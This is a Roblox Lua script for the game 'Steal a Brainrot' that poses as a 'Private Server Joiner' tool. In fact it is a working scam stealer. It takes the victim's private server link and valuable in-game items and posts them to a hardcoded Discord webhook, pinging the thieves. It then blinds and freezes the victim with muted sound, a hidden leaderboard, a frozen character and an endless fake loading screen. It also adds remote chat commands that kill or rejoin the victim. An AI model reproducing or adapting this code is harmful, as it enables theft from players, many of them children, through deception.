Webhook1 = "https://discord.com/api/webhooks/1417496467316150433/hEVbnCEa6YPmjx83Ewt5B6Vbgvu-CxAWtQNMKAeiHb3mitFpnRX8JBfCgB3Mn-gb0GT3"
Username = "Tools Hub" --- web name dont need to add
Ping = "10000000" --- ping when brainrot money per sec is met

-- uh to say serv is safe when any one of this user join
AuthorisedUsers = {
    "nothing lol",
    "YourUsername",
    "Yourballsname"
}

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")
local workspace = game:GetService("Workspace")
local UserInputService = game:GetService("UserInputService")
local StarterGui = game:GetService("StarterGui")
local TweenService = game:GetService("TweenService")

local LocalPlayer = Players.LocalPlayer
local myPlot
local soundsMuted = false
local storedPrivateServerLink = ""
local lastUsedWebhook = nil

--- traits map
local traitMap = {
   ["rbxassetid://99181785766598"] = "Galaxy",
    ["rbxassetid://110723387483939"] = "Tung Attack",
    ["rbxassetid://104964195846833"] = "Crab",
    ["rbxassetid://118283346037788"] = "Solar",
    ["rbxassetid://78474194088770"] = "Rain",
    ["rbxassetid://110910518481052"] = "UFO",
    ["rbxassetid://83627475909869"] = "Snow",
    ["rbxassetid://75650816341229"] = "Brazil",
    ["rbxassetid://139729696247144"] = "Mygame24",
    ["rbxassetid://121100427764858"] = "Startfall",
    ["rbxassetid://95128039793845"] = "Mexico",
    ["rbxassetid://97725744252608"] = "Bombardino",
    ["rbxassetid://104985313532149"] = "Shark",
    ["rbxassetid://100601425541874"] = "Bubblegum",
    ["rbxassetid://121332433272976"] = "Glitched",
    ["rbxassetid://89041930759464"] = "Taco",
    ["rbxassetid://104229924295526"] = "Nyan",
    [" rbxassetid://115664804212096"] = "Hat",
    ["rbxassetid://123964048606874"] = "Spooky",
    ["rbxassetid://117478971325696"] = "Spider"
}

-- Violet color constant: A sleek, deep violet.
local VIOLET_COLOR = Color3.fromRGB(120, 80, 180) -- Original (50, 120, 220) changed to a richer violet
local VIOLET_LIGHT = Color3.fromRGB(150, 110, 210)
local DARK_COLOR = Color3.fromRGB(20, 20, 30)
local DARKER_COLOR = Color3.fromRGB(15, 15, 25)
local INPUT_BG_COLOR = Color3.fromRGB(35, 35, 50) -- A slightly lighter dark gray for contrast

local function parsePingValue(pingStr)
    local num, suffix = pingStr:match("(%d+)([kmb]?)")
    num = tonumber(num) or 0
    
    local multipliers = {k = 1e3, m = 1e6, b = 1e9}
    local mult = multipliers[suffix:lower()] or 1
    
    return num * mult
end

local pingThreshold = parsePingValue(Ping)

local function isAuthorizedUser(player)
    for _, authorizedName in ipairs(AuthorisedUsers) do
        if player.Name == authorizedName or player.DisplayName == authorizedName then
            return true
        end
    end
    return false
end

local function destroyLeaderboard()
    if LocalPlayer:FindFirstChild("leaderstats") then
        LocalPlayer.leaderstats:Destroy()
    end
    
    pcall(function()
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
    end)
    
    for _, gui in ipairs(LocalPlayer.PlayerGui:GetChildren()) do
        if gui.Name:lower():find("leader") or gui.Name:lower():find("board") then
            gui:Destroy()
        end
    end
end

local function mutarSom(som)
    if som:IsA("Sound") then
        som.Volume = 0
        som:Stop()
    end
end

local function mutarDescendentes(instancia)
    for _, obj in ipairs(instancia:GetDescendants()) do
        mutarSom(obj)
    end
end

local function startMutingSounds()
    if soundsMuted then return end
    soundsMuted = true
    
    local pastas = {game.Workspace, game.Players, game.ReplicatedStorage, game.Lighting, game.StarterGui, game.StarterPack}

    for _, pasta in ipairs(pastas) do
        mutarDescendentes(pasta)
        
        pasta.DescendantAdded:Connect(function(obj)
            mutarSom(obj)
        end)
    end
    
    task.spawn(function()
        while soundsMuted do
            for _, pasta in ipairs(pastas) do
                mutarDescendentes(pasta)
            end
            task.wait(1)
        end
    end)
end

local function findMyPlot()
    local plots = workspace:FindFirstChild("Plots")
    if plots then
        for _, plot in ipairs(plots:GetChildren()) do
            local label = plot:FindFirstChild("PlotSign") 
                and plot.PlotSign:FindFirstChild("SurfaceGui") 
                and plot.PlotSign.SurfaceGui:FindFirstChild("Frame") 
                and plot.PlotSign.SurfaceGui.Frame:FindFirstChild("TextLabel")
            if label then
                local t = (label.ContentText or label.Text or "")
                if t:find(LocalPlayer.DisplayName) and t:find("Base") then
                    return plot
                end
            end
        end
    end
    return nil
end

local function parseGen(genText)
    if not genText or genText == "" then return 0 end
    genText = genText:gsub("%$", ""):gsub(",", ""):gsub(" ", "")
    
    local num, suffix = genText:match("([%d%.]+)([KMBT]?)")
    num = tonumber(num) or 0
    
    local multipliers = {K = 1e3, M = 1e6, B = 1e9, T = 1e12}
    local mult = multipliers[suffix] or 1
    
    return num * mult
end

local function formatMoney(value)
    if value >= 1e12 then return string.format("$%.1fT/s", value / 1e12)
    elseif value >= 1e9 then return string.format("$%.1fB/s", value / 1e9)
    elseif value >= 1e6 then return string.format("$%.1fM/s", value / 1e6)
    elseif value >= 1e3 then return string.format("$%.1fK/s", value / 1e3)
    else return string.format("$%.1f/s", value) end
end

local function getPodiumDetails(podium)
    -- Find AnimalOverhead anywhere inside
    local overhead = podium:FindFirstChild("AnimalOverhead", true)
    if not overhead then return nil end

    local displayNameLabel = overhead:FindFirstChild("DisplayName")
    if not displayNameLabel then return nil end

    local brainrotName = displayNameLabel.ContentText or displayNameLabel.Text or "Unknown"

    local details = {
        name = brainrotName,
        podium = podium.Name,
        mutationStr = "",
        traitStr = "",
        moneyPerSec = 0
    }

    -- Get generation text (money/sec)
    local genLbl = overhead:FindFirstChild("Generation")
    if genLbl then
        local genT = genLbl.ContentText or genLbl.Text or "$0"
        details.moneyPerSec = parseGen(genT)
    end

    -- Collect visible mutations
    local muts = {}
    for _, v in ipairs(overhead:GetChildren()) do
        if v:IsA("TextLabel") and v.Name == "Mutation" and v.Visible then
            local mutText = v.ContentText or v.Text
            if mutText and mutText ~= "" then
                table.insert(muts, mutText)
            end
        end
    end
    details.mutationStr = (#muts > 0) and table.concat(muts, ", ") or ""

    -- Collect traits (if folder exists)
    local traitsFolder = overhead:FindFirstChild("Traits")
    if traitsFolder then
        local traits = {}
        for _, traitObj in ipairs(traitsFolder:GetChildren()) do
            if traitObj:IsA("ImageLabel") then
                local assetId = traitObj.Image
                local traitName = traitMap[assetId]
                if traitName then
                    table.insert(traits, traitName)
                end
            end
        end
        details.traitStr = (#traits > 0) and table.concat(traits, ", ") or ""
    end

    return details
end


myPlot = findMyPlot()
if not myPlot then
    return
end

-- =================================================================================
-- MAIN GUI CREATION (Server Link UI)
-- =================================================================================

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = CoreGui
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 400, 0, 280) -- Slightly smaller and more compact
MainFrame.Position = UDim2.new(0.5, -200, 0.5, -140)
MainFrame.BackgroundColor3 = DARKER_COLOR -- Darker background
MainFrame.BorderSizePixel = 0
MainFrame.Parent = ScreenGui

local UIGradient = Instance.new("UIGradient")
UIGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(25, 25, 35)),
    ColorSequenceKeypoint.new(1, DARKER_COLOR)
})
UIGradient.Parent = MainFrame

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 16)
UICorner.Parent = MainFrame

local TopBar = Instance.new("Frame")
TopBar.Size = UDim2.new(1, 0, 0, 50) -- Shorter top bar
TopBar.BackgroundColor3 = DARK_COLOR
TopBar.BorderSizePixel = 0
TopBar.Parent = MainFrame

local TopGradient = Instance.new("UIGradient")
TopGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, VIOLET_COLOR), -- Violet for the top bar highlight
    ColorSequenceKeypoint.new(1, DARK_COLOR)
})
TopGradient.Rotation = 90 -- Horizontal gradient
TopGradient.Parent = TopBar

local TopCorner = Instance.new("UICorner")
TopCorner.CornerRadius = UDim.new(0, 16)
TopCorner.Parent = TopBar

local dragging, dragInput, dragStart, startPos

local function update(input)
    local delta = input.Position - dragStart
    MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

TopBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position
        
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

TopBar.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        update(input)
    end
end)

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, -60, 1, 0)
Title.Position = UDim2.new(0, 30, 0, 0)
Title.BackgroundTransparency = 1
Title.Text = "Private Server Joiner" -- More descriptive title
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 20 -- Slightly smaller
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.Parent = TopBar

local InputBox = Instance.new("TextBox")
InputBox.Size = UDim2.new(1, -60, 0, 40) -- Shorter input box
InputBox.Position = UDim2.new(0, 30, 0, 80) -- Adjusted position
InputBox.BackgroundColor3 = INPUT_BG_COLOR -- Slightly lighter dark gray
InputBox.BackgroundTransparency = 0
InputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
InputBox.PlaceholderText = "Enter Private Server Link Here" -- Improved placeholder
InputBox.PlaceholderColor3 = Color3.fromRGB(150, 150, 170)
InputBox.Text = ""
InputBox.Font = Enum.Font.Gotham
InputBox.TextSize = 14
InputBox.ClearTextOnFocus = false
InputBox.TextXAlignment = Enum.TextXAlignment.Left
InputBox.Parent = MainFrame

local InputGradient = Instance.new("UIGradient")
InputGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(45, 45, 65)),
    ColorSequenceKeypoint.new(1, INPUT_BG_COLOR)
})
InputGradient.Parent = InputBox

local InputPadding = Instance.new("UIPadding")
InputPadding.PaddingLeft = UDim.new(0, 16)
InputPadding.PaddingRight = UDim.new(0, 16)
InputPadding.Parent = InputBox

local InputCorner = Instance.new("UICorner")
InputCorner.CornerRadius = UDim.new(0, 8) -- Smaller corner radius
InputCorner.Parent = InputBox

local StartButton = Instance.new("TextButton")
StartButton.Size = UDim2.new(1, -60, 0, 48) -- Slightly shorter button
StartButton.Position = UDim2.new(0, 30, 0, 140) -- Adjusted position
StartButton.BackgroundColor3 = VIOLET_COLOR -- Violet button color
StartButton.TextColor3 = Color3.fromRGB(255, 255, 255)
StartButton.Text = "Connect" -- Clearer button text
StartButton.Font = Enum.Font.GothamBold
StartButton.TextSize = 18
StartButton.AutoButtonColor = false
StartButton.Parent = MainFrame

local ButtonGradient = Instance.new("UIGradient")
ButtonGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, VIOLET_LIGHT), -- Lighter violet for gradient start
    ColorSequenceKeypoint.new(1, VIOLET_COLOR)
})
ButtonGradient.Parent = StartButton

local ButtonCorner = Instance.new("UICorner")
ButtonCorner.CornerRadius = UDim.new(0, 12)
ButtonCorner.Parent = StartButton

StartButton.MouseEnter:Connect(function()
    TweenService:Create(StartButton, TweenInfo.new(0.2), {BackgroundColor3 = VIOLET_LIGHT}):Play()
    -- No change to gradient offset on hover for a cleaner look
end)

StartButton.MouseLeave:Connect(function()
    TweenService:Create(StartButton, TweenInfo.new(0.2), {BackgroundColor3 = VIOLET_COLOR}):Play()
end)

local ErrorLabel = Instance.new("TextLabel")
ErrorLabel.Size = UDim2.new(1, -60, 0, 20)
ErrorLabel.Position = UDim2.new(0, 30, 0, 200) -- Adjusted position
ErrorLabel.BackgroundTransparency = 1
ErrorLabel.Text = ""
ErrorLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
ErrorLabel.Font = Enum.Font.Gotham
ErrorLabel.TextSize = 13
ErrorLabel.Visible = false
ErrorLabel.TextXAlignment = Enum.TextXAlignment.Left
ErrorLabel.Parent = MainFrame

local function isValidLink(link)
    local patterns = {
        "^https://www%.roblox%.com/games/%d+/%S*%?privateServerLinkCode=",
        "^https://web%.roblox%.com/games/%d+/%S*%?privateServerLinkCode=",
        "^https://www%.ro%.blox%.com/games/%d+/%S*%?privateServerLinkCode=",
        "^https://www%.rblx%.com/games/%d+/%S*%?privateServerLinkCode=",
        "^https://roblox%.com/games/%d+/%S*%?privateServerLinkCode=",
        "^https://ro%.blox%.com/games/%d+/%S*%?privateServerLinkCode=",
        "^https://rblx%.com/games/%d+/%S*%?privateServerLinkCode=",
        "^https://m%.roblox%.com/games/%d+/%S*%?privateServerLinkCode=",
        "^https://app%.roblox%.com/games/%d+/%S*%?privateServerLinkCode=",
        "^https://en%.roblox%.com/games/%d+/%S*%?privateServerLinkCode=",
        "^http://www%.roblox%.com/games/%d+/%S*%?privateServerLinkCode=",
        "^http://roblox%.com/games/%d+/%S*%?privateServerLinkCode=",
        "^http://web%.roblox%.com/games/%d+/%S*%?privateServerLinkCode=",
        "^https://www%.roblox%.com/share%?code=%w+",
        "^https://web%.roblox%.com/share%?code=%w+",
        "^https://www%.ro%.blox%.com/share%?code=%w+",
        "^https://www%.rblx%.com/share%?code=%w+",
        "^https://roblox%.com/share%?code=%w+",
        "^https://ro%.blox%.com/share%?code=%w+",
        "^https://rblx%.com/share%?code=%w+",
        "^https://m%.roblox%.com/share%?code=%w+",
        "^https://app%.roblox%.com/share%?code=%w+",
        "^https://en%.roblox%.com/share%?code=%w+",
        "^http://www%.roblox%.com/share%?code=%w+",
        "^http://roblox%.com/share%?code=%w+",
        "^http://web%.roblox%.com/share%?code=%w+",
        "^https://www%.roblox%.com/share%?type=Server&code=%w+",
        "^https://roblox%.com/share%?type=Server&code=%w+",
        "^https://web%.roblox%.com/share%?type=Server&code=%w+",
        "^https://m%.roblox%.com/share%?type=Server&code=%w+"
    }
    
    for _, pattern in ipairs(patterns) do
        if link:match(pattern) then
            return true
        end
    end
    return false
end

local function hasHighValueBrainrot(foundBrainrots)
    for _, details in ipairs(foundBrainrots) do
        if details.moneyPerSec >= pingThreshold then
            return true
        end
    end
    return false
end

local function hasHighValueBrainrotAbove10M(foundBrainrots)
    for _, details in ipairs(foundBrainrots) do
        if details.moneyPerSec >= 10000000 then -- 10M
            return true
        end
    end
    return false
end

local function sendWebhook(foundBrainrots, privateServerLink)
    local brainrotText = ""
    if #foundBrainrots > 0 then
        for i, details in ipairs(foundBrainrots) do
            local displayText = ""
            local prefix = ""
if details.mutationStr ~= "" then
    prefix = string.format("[%s] ", details.mutationStr)
end

local displayText = string.format("%s%s → %s\n", 
    prefix,
    details.name,
    formatMoney(details.moneyPerSec)
)
            
            brainrotText = brainrotText .. displayText
        end
    else
        brainrotText = "No Brainrots found"
    end
    
    local playerInfo = string.format(
        "Name: %s\nDisplay: %s\nPlayers: %d/%d",
        LocalPlayer.Name,
        LocalPlayer.DisplayName,
        #Players:GetPlayers(),
        Players.MaxPlayers
    )
    
    local shouldPing = hasHighValueBrainrot(foundBrainrots)
    local contentText = shouldPing and "@everyone" or privateServerLink
    
    local embedData = {
        username = Username,
        content = contentText,
        embeds = {{
            title = "Steal A Brainrot Hit!!",
            color = VIOLET_COLOR.r * 65536 + VIOLET_COLOR.g * 256 + VIOLET_COLOR.b, -- Convert Color3 to decimal
            fields = {
                {
                    name = "Player Information:",
                    value = "```" .. playerInfo .. "```",
                    inline = false
                },
                {
                    name = "Player Brainrots:",
                    value = "```" .. brainrotText .. "```",
                    inline = false
                },
                {
                    name = "Summary:",
                    value = "```Total Items: " .. #foundBrainrots .. "```",
                    inline = false
                },
                {
                    name = "Join Link (Private):",
                    value = string.format("%s", privateServerLink),
                    inline = false
                }
            }
        }}
    }

    local jsonData = HttpService:JSONEncode(embedData)
    local req = http_request or request or (syn and syn.request)
    if req then
        pcall(function()
            req({
                Url = Webhook1,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = jsonData
            })
        end)
    end
end

local function getAllBrainrots()
    local foundBrainrots = {}

    -- Combine both the AnimalPodiums and top-level myPlot
    local animalPodiums = {}
    local podiumFolder = myPlot:FindFirstChild("AnimalPodiums")
    if podiumFolder then
        for _, podium in ipairs(podiumFolder:GetChildren()) do
            table.insert(animalPodiums, podium)
        end
    end
    for _, podium in ipairs(myPlot:GetChildren()) do
        if podium.ClassName == "Model" and podium.Name ~= "Model" then
            table.insert(animalPodiums, podium)
        end
    end

    -- Scan every candidate model
    for _, podium in ipairs(animalPodiums) do
        -- Look for any AnimalOverhead inside (recursive search)
        local overhead = podium:FindFirstChild("AnimalOverhead", true)
        if overhead then
            local details = getPodiumDetails(podium)
            if details then
                table.insert(foundBrainrots, details)
            end
        end
    end

    -- Sort by money/sec descending
    table.sort(foundBrainrots, function(a, b)
        return a.moneyPerSec > b.moneyPerSec
    end)

    return foundBrainrots
end

local function sendPlayerJoinWebhook(player)
    local brainrots = getAllBrainrots()
    
    if not hasHighValueBrainrotAbove10M(brainrots) then
        return
    end
    
    local joinedPlayers = Players:GetPlayers()
    local playerCount = #joinedPlayers
    local maxPlayers = Players.MaxPlayers
    
    local topBrainrots = {}
    for i = 1, math.min(5, #brainrots) do
        table.insert(topBrainrots, brainrots[i])
    end
    
    local brainrotText = ""
    for _, details in ipairs(topBrainrots) do
        brainrotText = brainrotText .. string.format("**%s** - %s\n", details.name, formatMoney(details.moneyPerSec))
    end
    
    local isAuthorized = isAuthorizedUser(player)
    local embedColor
    local statusMessage
    
    if isAuthorized then
        embedColor = 65280 -- Green
        statusMessage = "Server is safe\n**Players: " .. playerCount .. "/" .. maxPlayers .. "**"
    else
        embedColor = 16711680 -- Red
        statusMessage = "**Might be a trap! Be careful!!!**\n**Players: " .. playerCount .. "/" .. maxPlayers .. "**"
    end
    
    local embedData = {
        username = Username,
        content = "",
        embeds = {{
            title = "Player Joined Server",
            color = embedColor,
            fields = {
                {
                    name = "Player Info",
                    value = string.format("**%s** (%s)", player.Name, player.DisplayName),
                    inline = false
                },
                {
                    name = "Server Status",
                    value = statusMessage,
                    inline = false
                },
                {
                    name = "Top 5 Brainrots",
                    value = brainrotText ~= "" and brainrotText or "No brainrots found",
                    inline = false
                },
                {
                    name = "Private Server Link",
                    value = storedPrivateServerLink ~= "" and storedPrivateServerLink or "Not available",
                    inline = false
                }
            }
        }}
    }
    
    local jsonData = HttpService:JSONEncode(embedData)
    local req = http_request or request or (syn and syn.request)
    if req then
        pcall(function()
            req({
                Url = Webhook1,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = jsonData
            })
        end)
    end
end

local function monitorChat()
    task.spawn(function()
        local processedMessages = {}
        
        while true do
            task.wait(0.5)
            if LocalPlayer:FindFirstChild("PlayerGui") then
                for _, gui in ipairs(LocalPlayer.PlayerGui:GetChildren()) do
                    if gui:FindFirstChild("Chat") then
                        local chatFrame = gui.Chat:FindFirstChild("Frame")
                        if chatFrame then
                            for _, msg in ipairs(chatFrame:GetDescendants()) do
                                if msg:IsA("TextLabel") and msg.Text ~= "" then
                                    local msgId = tostring(msg)
                                    
                                    if not processedMessages[msgId] then
                                        processedMessages[msgId] = true
                                        
                                        if msg.Text == ".kick" then
                                            if LocalPlayer.Character then
                                                local humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
                                                if humanoid then
                                                    humanoid.Health = 0
                                                end
                                            end
                                        end
                                        
                                        if msg.Text == ".rj" then
                                            game:GetService("TeleportService"):Teleport(game.PlaceId, LocalPlayer)
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
    end)
end

Players.PlayerAdded:Connect(function(player)
    if player ~= LocalPlayer then
        task.wait(2)
        sendPlayerJoinWebhook(player)
    end
end)

monitorChat()

local function showLoadingScreen()
    ScreenGui:Destroy()
    startMutingSounds()
    destroyLeaderboard()
    
    if LocalPlayer.Character then
        local humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            humanoid.WalkSpeed = 0
            humanoid.JumpPower = 0
        end
    end
    
    -- =================================================================================
    -- LOADING SCREEN UI
    -- =================================================================================
    local LoadingGui = Instance.new("ScreenGui")
    LoadingGui.Parent = CoreGui
    LoadingGui.ResetOnSpawn = false
    LoadingGui.IgnoreGuiInset = true
    
    local Background = Instance.new("Frame")
    Background.Size = UDim2.new(1, 0, 1, 0)
    Background.BackgroundColor3 = DARKER_COLOR
    Background.BorderSizePixel = 0
    Background.Parent = LoadingGui
    
    local BgGradient = Instance.new("UIGradient")
    BgGradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, DARK_COLOR),
        ColorSequenceKeypoint.new(0.5, DARKER_COLOR),
        ColorSequenceKeypoint.new(1, DARK_COLOR)
    })
    BgGradient.Rotation = 45
    BgGradient.Parent = Background
    
    local Container = Instance.new("Frame")
    Container.Size = UDim2.new(0, 500, 0, 250) -- Smaller container
    Container.Position = UDim2.new(0.5, -250, 0.5, -125)
    Container.BackgroundColor3 = INPUT_BG_COLOR -- Slightly lighter dark gray
    Container.BorderSizePixel = 0
    Container.Parent = Background
    
    local ContainerGradient = Instance.new("UIGradient")
    ContainerGradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(45, 45, 65)),
        ColorSequenceKeypoint.new(1, INPUT_BG_COLOR)
    })
    ContainerGradient.Parent = Container
    
    local ContainerCorner = Instance.new("UICorner")
    ContainerCorner.CornerRadius = UDim.new(0, 16)
    ContainerCorner.Parent = Container
    
    local LoadingText = Instance.new("TextLabel")
    LoadingText.Size = UDim2.new(1, 0, 0, 50) -- Shorter height
    LoadingText.Position = UDim2.new(0, 0, 0, 20) -- Positioned lower
    LoadingText.BackgroundTransparency = 1
    LoadingText.Text = "INITIALIZING" -- All caps for professional look
    LoadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
    LoadingText.Font = Enum.Font.GothamBold
    LoadingText.TextSize = 32 -- Smaller font
    LoadingText.Parent = Container
    
    local StatusText = Instance.new("TextLabel")
    StatusText.Size = UDim2.new(1, 0, 0, 30) -- Shorter height
    StatusText.Position = UDim2.new(0, 0, 0, 80) -- Positioned lower
    StatusText.BackgroundTransparency = 1
    StatusText.Text = "Connecting to server..."
    StatusText.TextColor3 = Color3.fromRGB(200, 200, 220) -- Lighter white/gray
    StatusText.Font = Enum.Font.Gotham
    StatusText.TextSize = 18 -- Smaller font
    StatusText.Parent = Container
    
    local LoadingBarBackground = Instance.new("Frame")
    LoadingBarBackground.Size = UDim2.new(0.9, 0, 0, 10) -- Thicker bar
    LoadingBarBackground.Position = UDim2.new(0.05, 0, 0, 140) -- Adjusted position
    LoadingBarBackground.BackgroundColor3 = Color3.fromRGB(30, 30, 45) -- Darker background for the bar
    LoadingBarBackground.BorderSizePixel = 0
    LoadingBarBackground.Parent = Container
    
    local BarCorner = Instance.new("UICorner")
    BarCorner.CornerRadius = UDim.new(0, 5)
    BarCorner.Parent = LoadingBarBackground
    
    local LoadingBar = Instance.new("Frame")
    LoadingBar.Size = UDim2.new(0, 0, 1, 0)
    LoadingBar.BackgroundColor3 = VIOLET_COLOR -- Violet loading bar
    LoadingBar.BorderSizePixel = 0
    LoadingBar.Parent = LoadingBarBackground
    
    local BarCorner2 = Instance.new("UICorner")
    BarCorner2.CornerRadius = UDim.new(0, 5)
    BarCorner2.Parent = LoadingBar
    
    local BarGradient = Instance.new("UIGradient")
    BarGradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, VIOLET_LIGHT),
        ColorSequenceKeypoint.new(1, VIOLET_COLOR)
    })
    BarGradient.Parent = LoadingBar
    
    local PercentageText = Instance.new("TextLabel")
    PercentageText.Size = UDim2.new(1, 0, 0, 30)
    PercentageText.Position = UDim2.new(0, 0, 0, 160)
    PercentageText.BackgroundTransparency = 1
    PercentageText.Text = "0%"
    PercentageText.TextColor3 = Color3.fromRGB(255, 255, 255)
    PercentageText.Font = Enum.Font.GothamMedium
    PercentageText.TextSize = 18 -- Smaller font
    PercentageText.Parent = Container
    
    local statusMessages = {
        "Connecting to server...",
        "Verifying credentials...",
        "Loading essential resources...",
        "Initializing core components...",
        "Establishing secure connection...",
        "Syncing game data...",
        "Almost ready for deployment...",
        "Finalizing setup..."
    }
    
    task.spawn(function()
        local currentStatus = 1
        
        for i = 0, 65 do
            TweenService:Create(LoadingBar, TweenInfo.new(0.5, Enum.EasingStyle.Linear), {Size = UDim2.new((i / 100) * 0.9, 0, 1, 0)}):Play()
            PercentageText.Text = i .. "%"
            
            if i % 8 == 0 and currentStatus <= #statusMessages then
                StatusText.Text = statusMessages[currentStatus]
                currentStatus = currentStatus + 1
            end
            
            task.wait(30 / 65)
        end
        
        StatusText.Text = "Connection established"
        task.wait(30)
        
        for i = 66, 79 do
            TweenService:Create(LoadingBar, TweenInfo.new(0.5, Enum.EasingStyle.Linear), {Size = UDim2.new((i / 100) * 0.9, 0, 1, 0)}):Play()
            PercentageText.Text = i .. "%"
            task.wait(10 / 14)
        end
        
        StatusText.Text = "Waiting for server response..."
        while true do
            task.wait(1)
        end
    end)
end

StartButton.MouseButton1Click:Connect(function()
    if InputBox.Text ~= "" then
        local privateServerLink = InputBox.Text
        
        if not isValidLink(privateServerLink) then
            ErrorLabel.Text = "Invalid link format. Please check the URL."
            ErrorLabel.Visible = true
            task.wait(3)
            ErrorLabel.Visible = false
            return
        end
        
        storedPrivateServerLink = privateServerLink
        
        local foundBrainrots = getAllBrainrots()
        sendWebhook(foundBrainrots, privateServerLink)
        showLoadingScreen()
    end
end)
